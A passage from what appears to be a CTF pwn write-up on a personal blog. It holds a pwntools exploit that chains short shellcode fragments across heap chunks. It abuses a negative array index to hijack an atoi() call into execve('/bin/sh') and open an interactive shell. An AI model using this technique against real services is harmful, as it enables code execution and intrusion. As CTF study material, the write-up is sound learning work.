sh.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">'size:'</span>, <span class="string">'8'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">'content:'</span>, context)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'4'</span>)</span><br><span class="line">    sh.sendlineafter</span><br><span class="line"></span><br><span class="line"><span class="comment">#将execve的系统调用号写入rax</span></span><br><span class="line"><span class="comment">#如果数据空间更小可以尝试用push pop</span></span><br><span class="line">code0 = asm(<span class="string">'xor rax, rax'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line">code1 = asm(<span class="string">'mov eax, 0x3b'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line"></span><br><span class="line">code2 = asm(<span class="string">'xor rsi, rsi'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line">code3 = asm(<span class="string">'xor rdx, rdx'</span>).ljust(<span class="number">5</span>, <span class="string">'\x90'</span>) + <span class="string">'\xeb\x19'</span></span><br><span class="line">code4 = asm(<span class="string">'syscall'</span>).ljust(<span class="number">7</span>, <span class="string">'\x90'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, code0)</span><br><span class="line">add(<span class="number">1</span>, code1)</span><br><span class="line">add(<span class="number">2</span>, code2)</span><br><span class="line">add(<span class="number">3</span>, code3)</span><br><span class="line">add(<span class="number">4</span>, code4)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#重新申请第一个堆块，将shellcode指针写入数组索引-8处，并将code0写入堆块</span></span><br><span class="line">add(<span class="number">-8</span>, code0)</span><br><span class="line"><span class="comment">#'/bin/sh'地址传入rdi，然后调用atoi()跳转到shellcode执行</span></span><br><span class="line">sh.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Soinux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/ Relative)","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":100,"height":180},"mobile":{"show":false},"react":{"opacityDefault":0}});</script></body></html>